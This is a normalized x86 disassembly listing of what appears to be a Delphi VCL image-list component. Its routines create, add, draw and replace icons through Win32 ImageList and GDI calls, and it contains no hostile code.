jns r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_4472c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419854
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_447314
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419854
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_447368
push ebx
push esi
push edi
call sub_403490
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413e54
mov edx eax
mov eax edi
call sub_448334
mov eax [ edi + 0x50 ]
call sub_403104
mov eax edi
call sub_4476c4
mov eax [ edi + 0x4c ]
call sub_403104
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4198a0
test bl bl
jle r-xdata
call sub_403104
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
sub_4473d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_447481
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4482bc
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4474a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447488
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_4474a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447541
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_422e04
mov eax ebx
call sub_422284
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d3f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412938
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_422284
pop edx
call sub_41d798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447548
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_447564
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_4474a0
pop ecx
pop edx
pop ebx
retn
sub_44759c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44748c
test al al
je r-xdata
mov eax esi
call sub_447c5c
mov eax esi
call sub_4474a0
mov eax esi
mov si 0xffef
call sub_403300
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_4475e0
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44748c
test al al
je r-xdata
mov eax esi
call sub_447c5c
mov eax esi
call sub_4474a0
mov eax esi
mov si 0xffef
call sub_403300
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_447624
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4476c4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_447564
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403300
sub_447670
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_448244
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4222f0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4476c4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403300
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_447660
push eax
call ImageList_Destroy
sub_4476fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44778f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44748c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447796
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov edx eax
mov eax ebx
call sub_447c68
sub_44779c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44784b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44782e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_447494
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_447670
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447670
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447835
mov eax [ ebp - 0x10 ]
call sub_403104
retn
sub_447868
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447967
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447670
push eax
mov eax [ ebp - 0x4 ]
call sub_447660
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44796e
mov eax [ ebp - 0xc ]
call sub_403104
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447929
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4231a8
mov eax [ ebp - 0x4 ]
call sub_447494
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447650
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447670
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403104
retn
sub_447984
push ebx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_447660
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_4479a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447bbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44748c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447bc6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403e78
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448244
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_447868
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
push ebp
push sub_447b70
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447b50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447b33
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423054
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_422284
call sub_41db3c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_447660
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_422284
call sub_41db3c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_447660
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_447660
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b3a
mov eax [ ebp - 0x10 ]
call sub_403104
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
sub_447bd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447c4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_447984
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44748c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax ebx
mov si 0xffef
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c56
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push esi
mov eax ebx
call sub_447660
push eax
call ImageList_Remove
sub_447c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_447288
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403300
pop esi
pop ebx
retn
sub_447ca0
push ebx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_447660
push eax
call ImageList_GetBkColor
call sub_4472a8
pop ebx
retn
sub_447cc8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_447288
push eax
mov eax ebx
call sub_447ca0
call sub_447288
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41db3c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_447660
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d3f4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412938
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_422284
pop edx
call sub_41d798
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_422284
call sub_41db3c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_447660
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412938
mov eax [ ebx + 0x54 ]
call sub_422284
call sub_41db3c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d3f4
mov eax edi
call sub_41db3c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d3f4
mov eax edi
call sub_41db3c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_423054
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_447e9c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_447ec0
pop ebx
pop ebp
retn 0xc
sub_447ec0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_447f0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412938
mov eax [ ebp - 0x4 ]
call sub_448ba0
xor eax eax
push ebp
push sub_4480a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448088
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44806b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423054
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448072
mov eax [ ebp - 0x10 ]
call sub_403104
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_422284
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d798
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41db3c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_422284
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d798
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41db3c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44779c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4480b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_447660
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_447f0c
sub_4480d4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
call sub_4476c4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414328
mov eax ebx
call sub_447c5c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4482bc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_447660
mov edx eax
mov eax ebx
call sub_447564
mov eax ebx
call sub_44748c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_447660
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_447494
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_447660
push eax
call ImageList_GetBkColor
call sub_4472a8
mov edx eax
mov eax ebx
call sub_447c68
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4480b4
jmp r-xdata
sub_448194
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41440c
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4482bc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_447c5c
mov eax esi
call sub_447660
mov edx eax
mov eax ebx
call sub_447564
mov eax ebx
call sub_44748c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_447660
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_447494
jmp r-xdata
mov eax esi
call sub_447660
push eax
call ImageList_GetBkColor
call sub_4472a8
mov edx eax
mov eax ebx
call sub_447c68
mov edx esi
mov eax ebx
call sub_4480b4
pop esi
pop ebx
retn
sub_448244
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4482b0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482b7
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4482e4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413d6c
mov si 0xffff
call sub_403300
inc ebp
dec edi
jne r-xdata
sub_448334
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413c5c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413d6c
cmp ebp eax
jne r-xdata
sub_44838c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407ad0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4483d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_447984
mov ebx eax
mov eax edi
call sub_447984
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_447984
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4484ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44848f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44838c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448496
mov eax [ ebp - 0xc ]
call sub_403104
retn
mov eax edi
call sub_447984
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4484c0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_447984
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
